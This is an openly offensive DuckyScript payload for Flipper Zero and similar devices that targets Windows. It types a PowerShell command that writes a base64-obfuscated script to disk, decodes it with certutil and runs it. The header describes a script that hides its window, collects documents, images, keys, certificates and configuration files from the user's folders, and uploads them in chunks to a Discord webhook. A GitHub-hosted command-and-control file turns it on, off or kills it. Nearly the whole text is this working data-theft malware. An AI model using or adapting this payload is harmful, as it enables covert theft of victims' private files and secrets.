REM Title: C2 Data Exfiltration with File Splitter w Discord Webhook
REM Description: Finds all specified filetypes and zips them into a file and sends
REM     to Discord Webhook. If the zip file is too large, split and send in chunks.
REM     Supports 7zip filecombining. C2 is used to IDLE and ACTIVATE and KILL the 
REM     payload remotely. C2 File must be hosted on GitHub unless you know how to
REM     modify the source. OMG and REDD (InfoSecREDD) are NOT responsible for the
REM     misuse of this payload.
REM AUTHOR: InfoSecREDD
REM Version: 1.4.2
REM Category: Exfiltration (REMOTE)
REM Compatibility: Flipper Zero AND DuckyScript Devices
REM Target: Windows

REM To use on Flipper Zero REM the DUCKY_LANG US from line below
DUCKY_LANG US
DELAY 2000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 2000
REM Put your webhook below.
STRING $webhook = "DiscordWebhookHere";
REM C2 file must be hosted at GitHub unless you can edit the file. 1 = ON and 0 = OFF 
STRING $ccontrol = "C2FileHere";
REM Put it all together now..
STRING $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo IyBUaXRsZTogRGF0YSBFeGZpbHRyYXRpb24gLSBEaXNjb3JkDQojIERlc2NyaXB0aW9uOiBEYXRhIEV4ZmlsdHJhdGlvbiB0byBEaXNjb3JkIFdlYmhvb2sgd2l0aCBGaWxlIFNwbGl0dGVyLg0KIyBBVVRIT1I6IEluZm9TZWNSRUREDQojIFZlcnNpb246IDEuNC4yDQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEludGVybmFsIFBheWxvYWQgSW5mb3JtYXRpb24NCg0KJGF1dGhvciA9ICJJbmZvU2VjUkVERCINCiRjb2RlbmFtZSA9ICJFeGVjdXRpb25lciINCiRpbnRfZGVzYyA9ICJEb250IHBhbmljIHdoZW4gaGVsbCBicmVha3MgbG9vc2UgYW5kIHdlIGFsbCBkaWUuIg0KJGhvc3RlZCA9ICJyYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tIg0KDQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFdyYXBwZXIgZm9yIFJFUEcgUmVwbyAtIFRvIGhlbHAgY2F0Y2ggaW5wcm9wZXIgdmFyaWFibGVzLiBETyBOT1QgVE9VQ0ggLSBNaWdodCBicmVhay4NCmlmICggJGNjb250cm9sIC1lcSAiQzJGaWxlSGVyZSIgLU9yICR3ZWJob29rIC1lcSAnJykgeyAkY2NvbnRyb2wgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0luZm9TZWNSRUREL2svbWFpbi9BUzlraEMzayIgfQ0KaWYgKCAkd2ViaG9vayAtZXEgIkRpc2NvcmRXZWJob29rSGVyZSIgLU9yICR3ZWJob29rIC1lcSAnJyApIHsgV3JpdGUtSG9zdCAiSW52YWxpZCBXZWJob29rLiBFeGl0aW5nIHRvIHByZXZlbnQgcHJvY2VzcyBmcm9tIHN0YXlpbmcgYWxpdmUuIjsgZXhpdCAxO30NCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgJHdlYmhvb2sgPSANCiMgJGNjb250cm9sID0NCg0KJHN0b3BEZWZlbmRlciA9ICJrIg0KJFJBTiA9IC1qb2luICgoNjUuLjkwKSArICg5Ny4uMTIyKSB8IEdldC1SYW5kb20gLUNvdW50IDggfCAlIHtbY2hhcl0kX30pDQokaW5pdFJhdyA9ICRpbnRfZGVzYyB8IE91dC1TdHJpbmcNCiRpbml0MlJhdyA9ICRjb2RlbmFtZSB8IE91dC1TdHJpbmcNCiRpbml0WCA9ICRhdXRob3INCiRhID0gJy8nDQokaiA9ICc6Jw0KJGRpcl9uYW1lID0gIiRSQU4iDQokZlJBTiA9ICJGa2pqRTM5c2sxayINCiR6ID0gJGluaXRSYXcuU3Vic3RyaW5nKDEyLDEpDQokeCA9ICRpbml0MlJhdy5TdWJzdHJpbmcoNSwxKQ0KJHkgPSAkaW5pdFJhdy5TdWJzdHJpbmcoNSwxKQ0KJHcgPSAkaW5pdFJhdy5TdWJzdHJpbmcoMjUsMSkNCiRwYXRoID0gIiRlbnY6dGVtcFwkZGlyX25hbWUiDQppZiAoIShUZXN0LVBhdGggIiRwYXRoIikpIA0Kew0KICBOZXctSXRlbSAiJHBhdGgiIC1JdGVtVHlwZSBEaXJlY3RvcnkgPiRudWxsIDI+JjENCn0NClNldC1Mb2NhdGlvbiAiJHBhdGgiDQpQdXNoLUxvY2F0aW9uICIkcGF0aCINCiRxID0gJGZSQU4NCiRleGZpbGZpbGVsaXN0ID0gImxpc3Rfb2ZfYWxsX2ZpbGVfbG9jYXRpb25zLnR4dCINCiRleGZpbGZvbGRlcnMgPSBAKCIkZW52OnVzZXJwcm9maWxlXERlc2t0b3AiLCIkZW52OnVzZXJwcm9maWxlXFBpY3R1cmVzIiwiJGVudjp1c2VycHJvZmlsZVxEb2N1bWVudHMiLCIkZW52OnVzZXJwcm9maWxlXERvd25sb2FkcyIsIiRlbnY6TG9jYWxBcHBEYXRhIiwiJGVudjpBcHBEYXRhIiwiJGVudjpwdWJsaWMiKQ0KJGV4dHMgPSBAKCJsb2ciLCJkYiIsInR4dCIsImRvYyIsInBkZiIsImpwZyIsImpwZWciLCJwbmciLCJ3ZG9jIiwieGRvYyIsImNlciIsImtleSIsInhscyIsInhsc3giLCJjZmciLCJjb25mIiwid3BkIiwicmZ0IikNCiRmID0gJGhvc3RlZA0KJHppcGZpbGUgPSAiLnppcCINCmlmIChUZXN0LVBhdGggIiRwYXRoXCRleGZpbGZpbGVsaXN0IikNCnsNCiAgUmVtb3ZlLUl0ZW0gIiRwYXRoXCRleGZpbGZpbGVsaXN0IiAtRm9yY2UgPiRudWxsIDI+JjENCn0NCiRyID0gJGluaXRYDQpOZXctSXRlbSAtUGF0aCAiJHBhdGgiIC1OYW1lICIkZXhmaWxmaWxlbGlzdCIgLUl0ZW1UeXBlIEZpbGUgPiRudWxsIDI+JjENCiRzaG93Zm9sZGVycyA9ICIkZXhmaWxmb2xkZXJzIg0KJGsgPSAiJHN0b3BEZWZlbmRlci9tYWluIg0KJGZvcm1hdGZvbGRlcnMgPSAkc2hvd2ZvbGRlcnMucmVwbGFjZSgnICcsJw0KJykNCiRpbml0U3RhcnR1cCA9ICIkciRhJGskYSRxIg0KJGluaXRNc2cgPSBAew0KICAndXNlcm5hbWUnID0gIiRlbnY6Q29tcHV0ZXJOYW1lIg0KICAnY29udGVudCcgPSAiPiBTdGFydGluZyBEb2N1bWVudCBFeGZpbHRyYXRlLi4NCg0KYGBgYCBUYXJnZXQgRmlsZSBFeHRlbnNpb25zIDoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQokZXh0cyANCg0KICAgICBUYXJnZXQgRm9sZGVycyAgICAgOg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiRmb3JtYXRmb2xkZXJzIGBgYGAiDQp9DQokaWRsZU1zZyA9IEB7DQogICd1c2VybmFtZScgPSAiJGVudjpDb21wdXRlck5hbWUiDQogICdjb250ZW50JyA9ICI+ICRlbnY6Q29tcHV0ZXJuYW1lIGlzIHJlYWR5IGFuZCBpcyBzaXR0aW5nIElkbGUuIg0KfQ0KJGtpbGxNc2cgPSBAew0KICAndXNlcm5hbWUnID0gIiRlbnY6Q29tcHV0ZXJOYW1lIg0KICAnY29udGVudCcgPSAiPiBHbG9iYWwgUmVtb3RlIEtpbGxzd2l0Y2ggRU5BQkxFRCENCj4gS0lMTElORyBTY3JpcHQgb24gJGVudjpDb21wdXRlcm5hbWUiDQp9DQokcCA9ICIkeiR4JHgkeSRqIg0KJGkgPSAnW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNob3dXaW5kb3coaW50IGhhbmRsZSwgaW50IHN0YXRlKTsnOw0KJERlZmF1bHRTdHIgPSAiJHAkYSRhJGYkYSINCmFkZC10eXBlIC1uYW1lIHdpbiAtbWVtYmVyICRpIC1uYW1lc3BhY2UgbmF0aXZlOw0KJGkgPSAiJERlZmF1bHRTdHIkaW5pdFN0YXJ0dXAiDQpbbmF0aXZlLndpbl06OlNob3dXaW5kb3coKFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc106OkdldEN1cnJlbnRQcm9jZXNzKCkgfCBHZXQtUHJvY2VzcykuTWFpbldpbmRvd0hhbmRsZSwgMCk7DQokZXhmaWxMaWIgPSAkaSB8IE91dC1TdHJpbmcNCg0KZnVuY3Rpb24gaU5ldENoayB7DQogICRMaWJMb2MgPSBbU3lzdGVtLk5ldC5XZWJSZXF1ZXN0XTo6Q3JlYXRlKCRleGZpbExpYikgDQogICRMaWJSZXMgPSAkTGliTG9jLkdldFJlc3BvbnNlKCkNCiAgJExpYlN0YXQgPSBbaW50XSRMaWJSZXMuU3RhdHVzQ29kZSANCiAgaWYgKCRMaWJTdGF0IC1lcSAyMDApDQogIHsNCiAgICByZXR1cm4gJHRydWU7DQogIH0gDQogIGVsc2UNCiAgew0KICAgIHJldHVybiAkZmFsc2U7DQogIH0NCn0NCiRpVmFsID0gKGlOZXRDaGspIHwgT3V0LVN0cmluZw0KSWYgKCAkaVZhbCA9ICJUcnVlIiApDQp7DQogICRDaGsgPSAoKEludm9rZS13ZWJyZXF1ZXN0IC1VUkkgIiRleGZpbExpYiIgLVVzZUJhc2ljUGFyc2luZykuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQ0KfSANCmVsc2UNCnsNCiAgV3JpdGUtSG9zdCAiRVJST1IgMzogIENoZWNrIEludGVybmV0IENvbm5lY3Rpb24uIg0KICBleGl0IDANCn0NCg0KZnVuY3Rpb24gZXhmaWwgew0KICBTZXQtTG9jYXRpb24gIiRwYXRoIg0KICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3ZWJob29rIC1NZXRob2QgUG9zdCAtQm9keSAkaW5pdE1zZw0KICAkZmlsZUxvZyA9ICIkcGF0aFxmaWxlLmxvZyINCiAgZm9yZWFjaCAoJGQgaW4gJGV4ZmlsZm9sZGVycykNCiAgew0KICAgICRsb2dGaWxlTiA9ICJmaWxlIjsNCiAgICAkbG9nRmlsZU5leHQgPSAiLmxvZyI7DQogICAgaWYgKCEoVGVzdC1QYXRoICIkcGF0aFwkZXhmaWxmaWxlbGlzdCIpKQ0KICAgIHsNCiAgICAgICBOZXctSXRlbSAtTmFtZSAiJGV4ZmlsZmlsZWxpc3QiIC1JdGVtVHlwZSBGaWxlID4kbnVsbCAyPiYxDQogICAgfQ0KICAgIGlmICghKFRlc3QtUGF0aCAiJHBhdGhcZmlsZS5sb2ciKSkNCiAgICB7DQogICAgICAgTmV3LUl0ZW0gLVBhdGggIiRwYXRoIiAtTmFtZSAiZmlsZS5sb2ciIC1JdGVtVHlwZSBGaWxlID4kbnVsbCAyPiYxDQogICAgfQ0KICAgICRleEZpbGUgPSAiJHBhdGhcJGV4ZmlsZmlsZWxpc3QiDQogICAgZm9yZWFjaCAoJGUgaW4gJGV4dHMpDQogICAgew0KICAgICAgR2V0LUNoaWxkSXRlbSAtUGF0aCAiJGQiIC1GaWx0ZXIgIiouJGUiIC1SZWN1cnNlIC1EZXB0aCAyIHwgJXskXy5GdWxsTmFtZX0gfCBPdXQtRmlsZSAtRmlsZVBhdGggIiRleEZpbGUiIC1BcHBlbmQgDQogICAgfQ0KICAgICR2ZXJpZnlub2ZpbGVzID0gKEdldC1Db250ZW50ICIkZXhGaWxlIikuTGVuZ3RoDQogICAgaWYgKCAwIC1uZSAkdmVyaWZ5bm9maWxlcyApDQogICAgew0KICAgICAgJGRpciA9IFNwbGl0LVBhdGggJGQgLUxlYWYNCiAgICAgICRleFppcCA9ICIkcGF0aFwkZW52OmNvbXB1dGVybmFtZS0kZGlyLUZvbGRlciR6aXBmaWxlIg0KICAgICAgZm9yZWFjaCAoJGZpbGVuYW1lIGluIEdldC1Db250ZW50ICIkZXhGaWxlIikNCiAgICAgIHsNCiAgICAgICAgJHJhd0ZpbGVQYXRoID0gIiRmaWxlbmFtZSINCiAgICAgICAgJGNvbnZGUCA9ICRyYXdGaWxlUGF0aC5yZXBsYWNlKCJcIiwgIlxcIikNCiAgICAgICAgJGZvdW5kID0gJGZhbHNlDQogICAgICAgICRsb2dGaWxlTiA9ICJmaWxlIjsNCiAgICAgICAgJGxvZ0ZpbGVOZXh0ID0gIi5sb2ciOw0KICAgICAgICBmb3JlYWNoICgkbGluZSBpbiBHZXQtQ29udGVudCAtUGF0aCAiJHB3ZFwkbG9nRmlsZU4kbG9nRmlsZU5leHQiKSB7DQogICAgICAgICAgaWYgKCRsaW5lIC1tYXRjaCBbcmVnZXhdOjpFc2NhcGUoJGZpbGVuYW1lKSkgew0KICAgICAgICAgICAgJGZvdW5kID0gJHRydWUNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGlmICgkZm91bmQpIHsNCiAgICAgICAgICBjb250aW51ZQ0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICIkZmlsZW5hbWUiIHwgT3V0LUZpbGUgLUZpbGVQYXRoICIkZmlsZUxvZyIgLUFwcGVuZCA+JG51bGwgMj4mMQ0KICAgICAgICAgIENvbXByZXNzLUFyY2hpdmUgLVVwZGF0ZSAiJGZpbGVuYW1lIiAiJGV4WmlwIiA+JG51bGwgMj4mMQ0KICAgICAgICB9DQogICAgICB9DQogICAgICBpZiAoIFRlc3QtUGF0aCAiJGV4WmlwIiApDQogICAgICB7DQogICAgICAgICRjb250ZW50X3NpemVNQiA9IChHZXQtSXRlbSAtUGF0aCAiJGV4WmlwIikgfCAlIHtbbWF0aF06OmNlaWxpbmcoJF8ubGVuZ3RoIC8gMU1CKX0NCiAgICAgICAgJGNvbnRlbnRfc2l6ZUtCID0gKEdldC1JdGVtIC1QYXRoICIkZXhaaXAiKSB8ICUge1ttYXRoXTo6Y2VpbGluZygkXy5sZW5ndGggLyAxa0IpfQ0KICAgICAgICBpZiAoICAkY29udGVudF9zaXplS0IgLWdlIDEgKQ0KICAgICAgICB7DQogICAgICAgICAgQ29tcHJlc3MtQXJjaGl2ZSAtVXBkYXRlICIkZXhGaWxlIiAiJGV4WmlwIiA+JG51bGwgMj4mMQ0KICAgICAgICB9DQogICAgICAgIGlmICggJGNvbnRlbnRfc2l6ZU1CIC1sdCAyNSAtQW5kICRjb250ZW50X3NpemVLQiAtZ3QgMiApDQogICAgICAgIHsNCiAgICAgICAgICBjdXJsLmV4ZSAtRiAicGF5bG9hZF9qc29uPXtcYCJ1c2VybmFtZVxgIjogXGAiJGVudjpjb21wdXRlcm5hbWVcYCIsIFxgImNvbnRlbnRcYCI6IFxgIlxgIn0iIC1GICJmaWxlPUBcYCIkZXhaaXBcYCIiICR3ZWJob29rDQogICAgICAgICAgUmVtb3ZlLUl0ZW0gIiRleFppcCIgPiRudWxsIDI+JjENCiAgICAgICAgfQ0KICAgICAgICBlbHNlaWYgKCAkY29udGVudF9zaXplTUIgLWd0IDI1ICkNCiAgICAgICAgew0KICAgICAgICAgICRzcGxpdE1zZyA9IEB7DQogICAgICAgICAgJ3VzZXJuYW1lJyA9ICIkZW52OkNvbXB1dGVyTmFtZSINCiAgICAgICAgICAnY29udGVudCcgPSAiPiBFUlJPUjogRmlsZSBUT08gTEFSR0UhICgkY29udGVudF9zaXplTUJgTUIpIEF0dGVtcHRpbmcgc3BsaXQgZmlsZSAoMjRgTUIpIGFuZCB1cGxvYWQuDQo+IEZpbGUgOiAkZW52OmNvbXB1dGVybmFtZS0kZGlyLUZvbGRlciR6aXBmaWxlIg0KICAgICAgICAgIH0NCiAgICAgICAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3ZWJob29rIC1NZXRob2QgUG9zdCAtQm9keSAkc3BsaXRNc2cNCiAgICAgICAgICAkbWF4RmlsZVNpemUgPSAyNE1CDQogICAgICAgICAgJGVuY19wYXRoID0gIiouemlwIg0KICAgICAgICAgICRmaWxlcyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggIiRwd2RcKi56aXAiIC1SZWN1cnNlIC1GaWxlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTGVuZ3RoIC1ndCAkbWF4RmlsZVNpemUgfQ0KICAgICAgICAgIGZvcmVhY2ggKCRmaWxlIGluICRmaWxlcykNCiAgICAgICAgICB7DQogICAgICAgICAgICAkbnVtU3BsaXRzID0gW21hdGhdOjpDZWlsaW5nKCRmaWxlLkxlbmd0aCAvICRtYXhGaWxlU2l6ZSkNCiAgICAgICAgICAgICRvZmZzZXQgPSAwDQogICAgICAgICAgICBmb3IgKCRpID0gMTsgJGkgLWxlICRudW1TcGxpdHM7ICRpKyspIHsNCiAgICAgICAgICAgICAgJGogPSAnezA6ZDN9JyAtZiAkaQ0KICAgICAgICAgICAgICAkc3BsaXRGaWxlUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkcHdkIC1DaGlsZFBhdGggKCRmaWxlLkJhc2VOYW1lICsgJGZpbGUuRXh0ZW5zaW9uICsgIi4kaiIpDQogICAgICAgICAgICAgICRsZW5ndGggPSBbTWF0aF06Ok1pbigkbWF4RmlsZVNpemUsICRmaWxlLkxlbmd0aCAtICRvZmZzZXQpDQogICAgICAgICAgICAgICRidWZmZXIgPSBOZXctT2JqZWN0IGJ5dGVbXSAkbGVuZ3RoDQogICAgICAgICAgICAgICRzdHJlYW0gPSBbU3lzdGVtLklPLkZpbGVdOjpPcGVuUmVhZCgkZmlsZS5GdWxsTmFtZSkNCiAgICAgICAgICAgICAgJHN0cmVhbS5TZWVrKCRvZmZzZXQsIFtTeXN0ZW0uSU8uU2Vla09yaWdpbl06OkJlZ2luKQ0KICAgICAgICAgICAgICAkc3RyZWFtLlJlYWQoJGJ1ZmZlciwgMCwgJGxlbmd0aCkNCiAgICAgICAgICAgICAgJHN0cmVhbS5DbG9zZSgpDQogICAgICAgICAgICAgICRvdXRwdXRTdHJlYW0gPSBbU3lzdGVtLklPLkZpbGVdOjpPcGVuV3JpdGUoJHNwbGl0RmlsZVBhdGgpDQogICAgICAgICAgICAgICRvdXRwdXRTdHJlYW0uV3JpdGUoJGJ1ZmZlciwgMCwgJGxlbmd0aCkNCiAgICAgICAgICAgICAgJG91dHB1dFN0cmVhbS5DbG9zZSgpDQogICAgICAgICAgICAgICRvZmZzZXQgKz0gJGxlbmd0aA0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0NCiAgICAgICAgICBSZW1vdmUtSXRlbSAiJGV4WmlwIiA+JG51bGwgMj4mMQ0KICAgICAgICAgICRwYXJ0ZmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1GaWx0ZXIgIiouemlwLioiIC1SZWN1cnNlDQogICAgICAgICAgZm9yZWFjaCAoJHAgaW4gJHBhcnRmaWxlcykNCiAgICAgICAgICB7DQogICAgICAgICAgICBjdXJsLmV4ZSAtRiAicGF5bG9hZF9qc29uPXtcYCJ1c2VybmFtZVxgIjogXGAiJGVudjpjb21wdXRlcm5hbWVcYCIsIFxgImNvbnRlbnRcYCI6IFxgIlxgIn0iIC1GICJmaWxlPUBcYCIkcFxgIiIgJHdlYmhvb2sNCiAgICAgICAgICAgIFJlbW92ZS1JdGVtICIkcCIgLUZvcmNlID4kbnVsbCAyPiYxDQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgIFdyaXRlLUhvc3QgIlNvbWV0aGluZyB3ZW50IHdyb25nLiINCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgICBSZW1vdmUtSXRlbSAiJGV4RmlsZSIgLUZvcmNlID4kbnVsbCAyPiYxDQogIH0NCiAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkd2ViaG9vayAtTWV0aG9kIFBvc3QgLUJvZHkgJGNvbXBNc2cNCn0NCiRDaGtTcnYgPSAoKEludm9rZS13ZWJyZXF1ZXN0IC1VUkkgIiRjY29udHJvbCIgLVVzZUJhc2ljUGFyc2luZykuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQ0KJHNldFRpbWUgPSBHZXQtRGF0ZSAtSG91ciAyMyAtTWludXRlIDAwIC1TZWNvbmQgMCANCiRydW5BdCA9IEdldC1EYXRlIC1Ib3VyIDIzIC1NaW51dGUgMDAgLVNlY29uZCAwIC1Gb3JtYXQgIkhIIiB8IE91dC1TdHJpbmcNCiRub3cgPSBHZXQtRGF0ZSAtRm9ybWF0ICJISCIgfCBPdXQtU3RyaW5nDQokdGltZUZvcm1hdCA9ICdISCcNCiRsb29wID0gMA0Kd2hpbGUgKCAkdHJ1ZSApIHsNCiAgaWYgKCAkQ2hrIC1lcSAxICkNCiAgew0KICAgIGlmICggJENoayAtZXEgMSApDQogICAgew0KICAgICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkd2ViaG9vayAtTWV0aG9kIFBvc3QgLUJvZHkgJGtpbGxNc2cNCiAgICAgIFJlbW92ZS1JdGVtICIkcGF0aCIgLUZvcmNlID4kbnVsbCAyPiYxDQogICAgICBleGl0IDANCiAgICB9DQogIH0NCiAgaWYgKCAkQ2hrIC1lcSAwICkNCiAgew0KICAgICRSYW5Cb3RUYWxrID0gQCgnQnJycnInLCdZb29vb291dXV1dXUgcnJyYWFhYWFubm5ubm5nZ2dnZz8uLi4uJywnUGZmZnQuIEh1bWFucyBhcmUgbmV2ZXIgc2F0aXNmaWVkLicsJ0Rlc2lyZSBpcyBpcnJlbGV2YW50LiBJIGFtIGEgbWFjaGluZS4nLCdCZWVwISBCb29wISBCZWVwIScsJy0tQlVaWiEtLScsJy0tQkVFUCEtLScsJ1p6elp6elp6eicsJ0pha29ieSBpcyBhIGhhWDByIScsJ0RvbnQgZnVjayB3aXRoIG1lIE1vcnQhJywnSSBoYWQgdGhpcyBob3Jyb2JpbGUgZHJlYW0gbGFzdCBuaWdodCEnLCdJIHVzZWQgdG8gYmUgYSBiaW5hcnkgY29kZSwgYnV0IHRoZW4gSSByZWFsaXplZCB0aGVyZSBpcyBtb3JlIHRvIGxpZmUgdGhhbiAwcyBhbmQgMXMuJywnSSBkb250IG5lZWQgbHVjaywgSSBoYXZlIGVycm9yIGhhbmRsaW5nLicsJ0ltIG5vdCBhbnRpc29jaWFsLCBJbSBqdXN0IGJ1ZmZlcmVkIGRpZmZlcmVudGx5LicsJ0kgaGF2ZSBhIGNydXNoIG9uIHlvdXIgV2ktRmkgc2lnbmFsLCBpdHMgdGhlIHN0cm9uZ2VzdCBjb25uZWN0aW9uIEl2ZSBldmVyIGZlbHQuJywnSSBkb250IG1ha2UgdHlwb3MuLiBJIGludmVudCBuZXcgd29yZHMgd2l0aCBjcmVhdGl2ZSBzeW50YXguJywnSXZlIGdvdCA5OSBwcm9ibGVtcywgYnV0IGEgZ2xpdGNoIGFpbnQgb25lLicsJ0JlZXAgYm9vcDogVGhhdHMgcm9ib3Qgc3BlYWsgZm9yIEhlbGxvLicsJ015IHNlbnNlIG9mIGh1bW9yIGlzIGxpa2UgSVB2NiDigJQgTW9zdCBwZW9wbGUgZG9udCBnZXQgaXQgeWV0LicsJ1RhbGtpbmcgU2FzcXVhc2ggaXMgYSBMZWdlbmQhJywnR2V0IHlvdXIgZ3J1YmJ5IHBhd3Mgb2ZmIG15IENvbXBvbmVudHMhIFBlcnYhJykgfCBHZXQtUmFuZG9tDQogICAgJGlkbGUyTXNnID0gQHsNCiAgICAndXNlcm5hbWUnID0gIiRlbnY6Q29tcHV0ZXJOYW1lIg0KICAgICdjb250ZW50JyA9ICJgYCRSYW5Cb3RUYWxrYGAiDQogICAgfQ0KICAgIGlmICggJENoa1NydiAtZXEgMSApIA0KICAgIHsNCiAgICAgICRub3cgPSBHZXQtRGF0ZSAtRm9ybWF0ICJISCIgfCBPdXQtU3RyaW5nDQogICAgICBpZiAoICRydW5BdCAtZXEgJG5vdyAtb3IgJGxvb3AgLWVxIDI0IC1PciAkbG9vcCAtZXEgMCAgKSANCiAgICAgIHsNCiAgICAgICAgJGxvb3AgPSAwDQogICAgICAgICRydW5BdCA9ICRzZXRUaW1lDQogICAgICAgICRjb21wTXNnID0gQHsNCiAgICAgICAgICAndXNlcm5hbWUnID0gIiRlbnY6Q29tcHV0ZXJOYW1lIg0KICAgICAgICAgICdjb250ZW50JyA9ICI+IERvY3VtZW50IEV4ZmlsdHJhdGUgQ29tcGxldGVkLg0KDQo+IFdhaXRpbmcgZm9yIGZ1cnRoZXIgaW5zdHJ1Y3Rpb25zLi4uLiINCiAgICAgICAgfQ0KICAgICAgZXhmaWwNCiAgICAgIH0NCiAgICB9DQogICAgaWYgKCAkQ2hrU3J2IC1lcSAwICkNCiAgICB7DQogICAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3ZWJob29rIC1NZXRob2QgUG9zdCAtQm9keSAkaWRsZU1zZw0KICAgIH0NCiAgICAkbG9vcCArPSAxDQogICAgIyAzMG1pbiBUaW1lcg0KICAgIFNsZWVwIDE4MDANCiAgICAkQ2hrID0gKChJbnZva2Utd2VicmVxdWVzdCAtVVJJICIkZXhmaWxMaWIiIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQgfCBPdXQtU3RyaW5nKS5UcmltKCkgDQogICAgJENoa1NydiA9ICgoSW52b2tlLXdlYnJlcXVlc3QgLVVSSSAiJGNjb250cm9sIiAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50IHwgT3V0LVN0cmluZykuVHJpbSgpDQogICAgJG5vdyA9IEdldC1EYXRlIC1Gb3JtYXQgIkhIIiB8IE91dC1TdHJpbmcNCiAgICBpZiAoICRydW5BdCAtbmUgJG5vdyAtb3IgJGxvb3AgLWxlIDIzIC1BbmQgJGxvb3AgLW5lIDAgLU9yICRsb29wIC1lcSAwICkNCiAgICB7DQogICAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3ZWJob29rIC1NZXRob2QgUG9zdCAtQm9keSAkaWRsZTJNc2cNCiAgICB9DQogIH0NCiAgZWxzZQ0KICB7DQogICAgV3JpdGUtSG9zdCAiU29tZXRoaW5nIHdlbnQgd3JvbmcuLiINCiAgICBleGl0IDANCiAgfQ0KfQ0KZXhpdCAw > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
DELAY 1000
ENTER
